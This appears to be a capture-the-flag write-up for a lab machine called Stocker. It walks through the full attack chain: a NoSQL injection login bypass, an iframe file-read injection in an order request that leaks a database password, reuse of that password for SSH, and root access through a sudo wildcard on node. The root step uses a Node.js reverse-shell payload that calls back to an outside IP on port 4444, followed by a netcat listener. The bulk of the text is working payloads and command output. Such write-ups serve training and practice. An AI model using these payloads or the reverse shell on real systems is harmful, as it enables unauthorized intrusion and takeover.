## Enumeration


http://stocker.htb/



Nmap scan report for stocker.htb (10.10.11.196)
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4EB67963EC58BC699F15F80BBE1D91CC
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Stock - Coming Soon!
|_http-generator: Eleventy v2.0.0
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



http://dev.stocker.htb/


Nmap scan report for dev.stocker.htb (10.10.11.196)
Host is up (0.051s latency).
rDNS record for 10.10.11.196: stocker.htb
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-title: Stockers Sign-in
|_Requested resource was /login
|_http-generator: Hugo 0.84.0
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel




so dev is the target cause have chance to menage with post request ! 



##  Webapp



Every /GET request is redirecting to /login

i see that the node.js express application can be implemented in 2 different ways as db sql and nosql 


unfortunatly sql is not working 



i tried different nosql injection and i bypass the auth with this request



```
{"username": {"$ne": null}, "password": {"$ne": null} }
```







## Purchase
```html
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 231
Connection: close
Cookie: connect.sid=s%3AvdFP0aALtjkB75hCcZgPtc0FXl2I61DX.1rhRAdQLqmtluYgGTUBEV1qCMsJZRdb6S%2F7HPMr6dGw
DNT: 1
Sec-GPC: 1

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe src=file:///var/www/dev/index.js width=1000 height=800></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```







const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";





## SSH



with ssh we can login with ssh angoose@stocker.htb IHeardPassphrasesArePrettySecure






## Privilage Escaltion


sudo -l : reveals a list user's privileges or check a specific command `/usr/bin/node /usr/local/scripts/*.js/` 

so we can try let node reads some malicius js content like this:


```js
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "10.10.14.109", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();

```

and boom


### Root

```
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.109] from (UNKNOWN) [10.10.11.196] 52126
l
/bin/sh: 1: l: not found
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@stocker:/tmp# ls

```


